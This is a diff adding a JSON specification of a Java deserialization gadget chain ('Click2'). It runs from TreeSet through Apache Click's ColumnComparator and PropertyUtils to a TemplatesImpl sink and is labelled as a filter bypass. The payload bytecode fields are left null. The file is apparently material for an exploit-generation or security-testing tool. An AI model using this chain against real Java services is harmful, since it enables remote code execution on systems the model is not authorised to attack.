@@ -1,0 +1,28 @@
+{
+    "chain_type": "Click2 — TreeSet + ColumnComparator → PropertyUtils → TemplatesImpl (filter-bypass)",
+    "root_class": "java.util.TreeSet",
+    "root_trigger": "readObject→TreeMap.put→ColumnComparator.compare→PropertyUtils.getProperty",
+    "links": [
+        {
+            "class": "org.apache.click.control.Column$ColumnComparator",
+            "field_overrides": {
+                "column": {"$ref": "link:1"}
+            }
+        },
+        {
+            "class": "org.apache.click.control.Column",
+            "field_overrides": {
+                "name": "outputProperties"
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
